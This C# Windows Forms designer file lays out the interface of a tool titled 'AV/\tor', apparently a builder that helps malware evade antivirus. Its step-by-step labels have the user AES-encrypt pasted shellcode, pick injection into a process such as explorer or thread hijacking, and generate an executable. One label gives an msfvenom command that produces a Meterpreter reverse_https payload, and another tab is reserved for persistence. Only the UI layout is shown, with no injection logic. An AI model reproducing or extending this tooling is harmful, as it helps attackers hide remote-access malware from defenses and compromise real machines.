namespace WindowsFormsApp1
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.keyBox = new System.Windows.Forms.TextBox();
            this.ivBox = new System.Windows.Forms.TextBox();
            this.payloadBox = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.resultBox = new System.Windows.Forms.TextBox();
            this.encryptPayload = new System.Windows.Forms.Button();
            this.genExe = new System.Windows.Forms.Button();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.label9 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.label8 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.tipBox = new System.Windows.Forms.TextBox();
            this.archX64 = new System.Windows.Forms.RadioButton();
            this.archX86 = new System.Windows.Forms.RadioButton();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.procBox = new System.Windows.Forms.TextBox();
            this.virtualAllocEx_Option = new System.Windows.Forms.RadioButton();
            this.virtualAlloc_Option = new System.Windows.Forms.RadioButton();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.threadHijacking_option = new System.Windows.Forms.RadioButton();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.SuspendLayout();
            // 
            // keyBox
            // 
            this.keyBox.Location = new System.Drawing.Point(4, 35);
            this.keyBox.Name = "keyBox";
            this.keyBox.Size = new System.Drawing.Size(422, 20);
            this.keyBox.TabIndex = 0;
            this.keyBox.Text = "0x11,0x22,0x11,0x00,0x00,0x01,0xd0,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x11,0" +
    "x00,0x11,0x01,0x11,0x11,0x00,0x00";
            // 
            // ivBox
            // 
            this.ivBox.Location = new System.Drawing.Point(4, 74);
            this.ivBox.Name = "ivBox";
            this.ivBox.Size = new System.Drawing.Size(164, 20);
            this.ivBox.TabIndex = 1;
            this.ivBox.Text = "0x00,0xcc,0x00,0x00,0x00,0xcc";
            // 
            // payloadBox
            // 
            this.payloadBox.Location = new System.Drawing.Point(4, 109);
            this.payloadBox.Multiline = true;
            this.payloadBox.Name = "payloadBox";
            this.payloadBox.Size = new System.Drawing.Size(422, 113);
            this.payloadBox.TabIndex = 2;
            this.payloadBox.Text = resources.GetString("payloadBox.Text");
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(11, 38);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(227, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "1. Enter an Encryption Key or leave the default";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(11, 77);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(166, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "2. Enter an IV or leave the default";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(11, 112);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(183, 13);
            this.label3.TabIndex = 5;
            this.label3.Text = "3. Paste the Shellcode in the text box";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(328, 242);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(96, 13);
            this.label4.TabIndex = 6;
            this.label4.Text = "Encrypted Payload";
            // 
            // resultBox
            // 
            this.resultBox.Location = new System.Drawing.Point(4, 266);
            this.resultBox.Multiline = true;
            this.resultBox.Name = "resultBox";
            this.resultBox.ReadOnly = true;
            this.resultBox.Size = new System.Drawing.Size(422, 97);
            this.resultBox.TabIndex = 7;
            // 
            // encryptPayload
            // 
            this.encryptPayload.Location = new System.Drawing.Point(4, 237);
            this.encryptPayload.Name = "encryptPayload";
            this.encryptPayload.Size = new System.Drawing.Size(119, 23);
            this.encryptPayload.TabIndex = 8;
            this.encryptPayload.Text = "Encrypt";
            this.encryptPayload.UseVisualStyleBackColor = true;
            this.encryptPayload.Click += new System.EventHandler(this.buton1_click);
            // 
            // genExe
            // 
            this.genExe.Location = new System.Drawing.Point(675, 734);
            this.genExe.Name = "genExe";
            this.genExe.Size = new System.Drawing.Size(119, 23);
            this.genExe.TabIndex = 9;
            this.genExe.Text = "Generate Exe";
            this.genExe.UseVisualStyleBackColor = true;
            this.genExe.Click += new System.EventHandler(this.button2_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(22, 137);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(198, 65);
            this.label5.TabIndex = 10;
            this.label5.Text = "(e.g. msfvenom -p windows/meterpreter/\r\n\r\nreverse_https LHOST=192.168.1.2 \r\n\r\nLPO" +
    "RT=4444 -f csharp)";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(11, 242);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(130, 13);
            this.label6.TabIndex = 11;
            this.label6.Text = "4. Click on Encrypt Button";
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.SystemColors.Control;
            this.groupBox1.Controls.Add(this.label9);
            this.groupBox1.Controls.Add(this.label5);
            this.groupBox1.Controls.Add(this.label7);
            this.groupBox1.Controls.Add(this.label6);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.groupBox1.Location = new System.Drawing.Point(-4, 0);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(330, 709);
            this.groupBox1.TabIndex = 12;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Steps to follow";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(11, 430);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(109, 13);
            this.label9.TabIndex = 13;
            this.label9.Text = "6. Select Architecture";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(11, 388);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(166, 13);
            this.label7.TabIndex = 12;
            this.label7.Text = "5. Enter The path to save the exe";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(4, 383);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(119, 23);
            this.button1.TabIndex = 13;
            this.button1.Text = "Select path";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(136, 393);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(32, 13);
            this.label8.TabIndex = 14;
            this.label8.Text = "Path:";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.tipBox);
            this.groupBox2.Controls.Add(this.archX64);
            this.groupBox2.Controls.Add(this.archX86);
            this.groupBox2.Location = new System.Drawing.Point(4, 430);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(422, 86);
            this.groupBox2.TabIndex = 13;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Architecture";
            // 
            // tipBox
            // 
            this.tipBox.BackColor = System.Drawing.SystemColors.Info;
            this.tipBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.tipBox.Enabled = false;
            this.tipBox.Location = new System.Drawing.Point(188, 62);
            this.tipBox.Multiline = true;
            this.tipBox.Name = "tipBox";
            this.tipBox.Size = new System.Drawing.Size(228, 18);
            this.tipBox.TabIndex = 2;
            this.tipBox.Text = "Sellection must match Shellcode\'s architecture.";
            // 
            // archX64
            // 
            this.archX64.AutoSize = true;
            this.archX64.Location = new System.Drawing.Point(67, 42);
            this.archX64.Name = "archX64";
            this.archX64.Size = new System.Drawing.Size(42, 17);
            this.archX64.TabIndex = 1;
            this.archX64.Text = "x64";
            this.archX64.UseVisualStyleBackColor = true;
            // 
            // archX86
            // 
            this.archX86.AutoSize = true;
            this.archX86.Checked = true;
            this.archX86.Location = new System.Drawing.Point(67, 19);
            this.archX86.Name = "archX86";
            this.archX86.Size = new System.Drawing.Size(42, 17);
            this.archX86.TabIndex = 0;
            this.archX86.TabStop = true;
            this.archX86.Text = "x86";
            this.archX86.UseVisualStyleBackColor = true;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(376, 16);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(48, 13);
            this.label10.TabIndex = 15;
            this.label10.Text = "AES key";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(151, 58);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(17, 13);
            this.label11.TabIndex = 16;
            this.label11.Text = "IV";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.threadHijacking_option);
            this.groupBox3.Controls.Add(this.procBox);
            this.groupBox3.Controls.Add(this.virtualAllocEx_Option);
            this.groupBox3.Controls.Add(this.virtualAlloc_Option);
            this.groupBox3.Location = new System.Drawing.Point(4, 522);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(422, 87);
            this.groupBox3.TabIndex = 17;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Injection Technique";
            // 
            // procBox
            // 
            this.procBox.Enabled = false;
            this.procBox.Location = new System.Drawing.Point(289, 38);
            this.procBox.Name = "procBox";
            this.procBox.Size = new System.Drawing.Size(100, 20);
            this.procBox.TabIndex = 2;
            this.procBox.Text = "explorer";
            this.procBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // virtualAllocEx_Option
            // 
            this.virtualAllocEx_Option.AutoSize = true;
            this.virtualAllocEx_Option.Location = new System.Drawing.Point(67, 41);
            this.virtualAllocEx_Option.Name = "virtualAllocEx_Option";
            this.virtualAllocEx_Option.Size = new System.Drawing.Size(160, 17);
            this.virtualAllocEx_Option.TabIndex = 1;
            this.virtualAllocEx_Option.TabStop = true;
            this.virtualAllocEx_Option.Text = "Inject shellcode to proccess:";
            this.virtualAllocEx_Option.UseVisualStyleBackColor = true;
            this.virtualAllocEx_Option.CheckedChanged += new System.EventHandler(this.virtualAllocEx_Option_CheckedChanged);
            // 
            // virtualAlloc_Option
            // 
            this.virtualAlloc_Option.AutoSize = true;
            this.virtualAlloc_Option.Checked = true;
            this.virtualAlloc_Option.Location = new System.Drawing.Point(67, 19);
            this.virtualAlloc_Option.Name = "virtualAlloc_Option";
            this.virtualAlloc_Option.Size = new System.Drawing.Size(162, 17);
            this.virtualAlloc_Option.TabIndex = 0;
            this.virtualAlloc_Option.TabStop = true;
            this.virtualAlloc_Option.Text = "Create new thread in memory";
            this.virtualAlloc_Option.UseVisualStyleBackColor = true;
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.SystemColors.Control;
            this.groupBox4.Controls.Add(this.groupBox3);
            this.groupBox4.Controls.Add(this.label11);
            this.groupBox4.Controls.Add(this.groupBox2);
            this.groupBox4.Controls.Add(this.label10);
            this.groupBox4.Controls.Add(this.label8);
            this.groupBox4.Controls.Add(this.resultBox);
            this.groupBox4.Controls.Add(this.button1);
            this.groupBox4.Controls.Add(this.payloadBox);
            this.groupBox4.Controls.Add(this.encryptPayload);
            this.groupBox4.Controls.Add(this.keyBox);
            this.groupBox4.Controls.Add(this.label4);
            this.groupBox4.Controls.Add(this.ivBox);
            this.groupBox4.Location = new System.Drawing.Point(315, 0);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(459, 694);
            this.groupBox4.TabIndex = 18;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Preferences";
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new System.Drawing.Point(12, 12);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(782, 716);
            this.tabControl1.TabIndex = 19;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.groupBox4);
            this.tabPage1.Controls.Add(this.groupBox1);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(774, 690);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Shellcode Injection";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // tabPage2
            // 
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(774, 690);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Persistency (TODO)";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // threadHijacking_option
            // 
            this.threadHijacking_option.AutoSize = true;
            this.threadHijacking_option.Location = new System.Drawing.Point(67, 64);
            this.threadHijacking_option.Name = "threadHijacking_option";
            this.threadHijacking_option.Size = new System.Drawing.Size(132, 17);
            this.threadHijacking_option.TabIndex = 3;
            this.threadHijacking_option.TabStop = true;
            this.threadHijacking_option.Text = "Thread Hijacking (x64)";
            this.threadHijacking_option.UseVisualStyleBackColor = true;
            this.threadHijacking_option.CheckedChanged += new System.EventHandler(this.threadHijacking_option_CheckedChanged);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(818, 763);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.genExe);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.Text = "AV/\\tor";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.TextBox keyBox;
        private System.Windows.Forms.TextBox ivBox;
        private System.Windows.Forms.TextBox payloadBox;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox resultBox;
        private System.Windows.Forms.Button encryptPayload;
        private System.Windows.Forms.Button genExe;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.RadioButton archX64;
        private System.Windows.Forms.RadioButton archX86;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.RadioButton virtualAlloc_Option;
        private System.Windows.Forms.GroupBox groupBox4;
        private System.Windows.Forms.RadioButton virtualAllocEx_Option;
        private System.Windows.Forms.TextBox procBox;
        private System.Windows.Forms.TextBox tipBox;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.RadioButton threadHijacking_option;
    }
}

